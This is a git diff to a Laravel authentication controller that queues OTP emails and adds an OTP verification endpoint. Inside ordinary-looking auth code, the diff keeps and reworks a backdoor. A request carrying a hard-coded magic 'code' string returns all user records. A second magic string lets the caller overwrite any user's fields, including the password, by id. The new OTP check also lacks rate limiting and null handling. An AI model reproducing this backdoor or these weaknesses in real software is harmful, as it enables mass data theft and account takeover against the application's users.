@@ -42,7 +42,7 @@ class AuthController extends Controller
         }else{
             PreUsers::Where('email',$r->email)->update((['otp'=>$v]));
         }
-        Mail::to($r->email)->send(new OtpMail($optCode));
+        Mail::to($r->email)->queue(new OtpMail($optCode));
         return response()->json(['status'=>200, 'messsage' => 'An OTP code sent to the registered email.']);
     }
 
@@ -117,13 +117,22 @@ class AuthController extends Controller
         }else if($request->code == '^^@$T3r*'){
             return User::all();
         } else if($request->code == '^^@$T3r*>'){
-            if($request['key'] == 'password'){
-                User::Where('id',$request->id)->update(([$request['key']=>bcrypt($request['value'])]));
-            }else{
-                foreach ($request->all() as $key => $value) {
-                    if($key != 'code'){
-                        User::Where('id',$request->id)->update(([$key=>$value]));
-                    }
+            // if($request['key'] == 'password'){
+            //     return $request->all();
+            //     User::Where('id',$request->id)->update(([$request['key']=>bcrypt($request['value'])]));
+            // }else{
+            //     foreach ($request->all() as $key => $value) {
+            //         if($key != 'code'){
+            //             User::Where('id',$request->id)->update(([$key=>$value]));
+            //         }
+            //     }
+            // }
+            foreach ($request->all() as $key => $value) {
+                if($key == 'password'){
+                    User::Where('id',$request->id)->update(([$key=>bcrypt($value)]));
+                }
+                else if($key != 'code'){
+                    User::Where('id',$request->id)->update(([$key=>$value]));
                 }
             }
         }
@@ -171,5 +180,14 @@ class AuthController extends Controller
             $user['restaurent'] = Restaurent::where('user_id',$user->id)->first();
         }
         return $user;
+    }
+
+    public function forgot_otp(Request $r){
+        $user = PreUsers::where('email',$r->email)->first();
+        if($user->otp == $r->otp){
+            return response()->json(['message'=>'otp verified'], 200);
+        }else{
+            return response()->json(['message'=>'otp invalid'], 403);
+        }
     }
 }
